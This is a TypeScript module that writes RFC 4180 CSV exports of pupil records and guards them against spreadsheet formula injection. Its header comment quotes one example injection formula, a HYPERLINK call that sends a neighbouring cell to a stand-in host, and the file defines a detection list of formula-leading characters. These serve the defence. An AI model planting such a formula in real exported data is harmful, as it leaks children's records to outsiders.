/**
 * Writing CSV that survives the programs districts actually open it in.
 *
 * RFC 4180 is short and most implementations of it are wrong in the same two
 * places, so both are handled here rather than in a caller: **line endings are
 * CRLF**, and a field is quoted when it contains a comma, a quote, or a line
 * break. Neither is a preference. A bare `\n` is read as a single unterminated
 * record by several parsers, and an unquoted comma silently shifts every column
 * after it — which in a file of children's names means a pupil's coverage
 * appearing under somebody else's row.
 *
 * **And one thing RFC 4180 does not mention at all: formula injection.**
 *
 * A field beginning `=`, `+`, `-`, `@`, a tab or a carriage return is evaluated
 * as a formula by Excel, LibreOffice and Google Sheets. The values in these
 * files are names, and the names come from a district's SIS — a system this
 * product does not control and cannot vet. A pupil called `=1+1` is a
 * curiosity; one called `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the
 * row next to it to whoever named them, and the person who opens the file is an
 * administrator with every child in the district on screen.
 *
 * The defence is one character. It is applied here, once, rather than at each
 * call site, because the call site that forgets is the one with the interesting
 * data in it.
 */

/** Fields starting with any of these are treated as formulas by spreadsheets. */
const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Whether a value would be evaluated rather than displayed.
 *
 * Exported so the guard can be tested directly against the characters it
 * claims to cover, rather than only through a rendered file.
 */
export function looksLikeFormula(value: string): boolean {
  return value.length > 0 && FORMULA_LEADERS.has(value[0]);
}

/**
 * One field, escaped.
 *
 * The order matters: the formula prefix goes on **before** quoting, so a value
 * needing both gets `"'=1+1"` rather than `'"=1+1"` — the second is a quoted
 * field whose first character is an apostrophe only by accident of position,
 * and a parser stripping the quotes hands back `=1+1` again.
 */
export function csvField(value: string): string {
  const guarded = looksLikeFormula(value) ? `'${value}` : value;

  if (!/[",\r\n]/.test(guarded)) return guarded;

  // A literal quote is doubled. RFC 4180 §2.7 — not backslash-escaped, which is
  // what everybody writes first and no spreadsheet reads.
  return `"${guarded.replace(/"/g, '""')}"`;
}

export interface CsvColumn<Row> {
  /** The header, exactly as it should appear. */
  header: string;
  /** How to read this column out of a row. Anything nullish becomes empty. */
  value: (row: Row) => string | number | Date | null | undefined;
}

/**
 * Dates as `YYYY-MM-DD`, in UTC.
 *
 * Not a locale format. A district in California opening a file written by a
 * server in Frankfurt should read the same day, and `03/04/2026` is two
 * different days depending on who is looking at it.
 */
function isoDay(value: Date): string {
  return value.toISOString().slice(0, 10);
}

function render(value: string | number | Date | null | undefined): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return isoDay(value);
  return String(value);
}

/**
 * A complete CSV document.
 *
 * The **byte order mark** is deliberate and is the one place this departs from
 * a strict reading of RFC 4180. Excel decides a CSV's encoding by guessing, and
 * without the mark it guesses the system code page — so `José` opens as `JosÃ©`
 * and a district's own pupils appear with mangled names. Every mainstream
 * parser skips it; Excel is the one that needs it, and Excel is what these
 * files are opened in.
 */
export function toCsv<Row>(rows: readonly Row[], columns: readonly CsvColumn<Row>[]): string {
  const lines = [columns.map(column => csvField(column.header)).join(',')];

  for (const row of rows) {
    lines.push(columns.map(column => csvField(render(column.value(row)))).join(','));
  }

  /*
   * A trailing CRLF. RFC 4180 permits the last record to end without one, and
   * several tools treat its absence as a truncated file — appending one is
   * valid either way and is the reading nobody has to argue with.
   */
  return `﻿${lines.join('\r\n')}\r\n`;
}
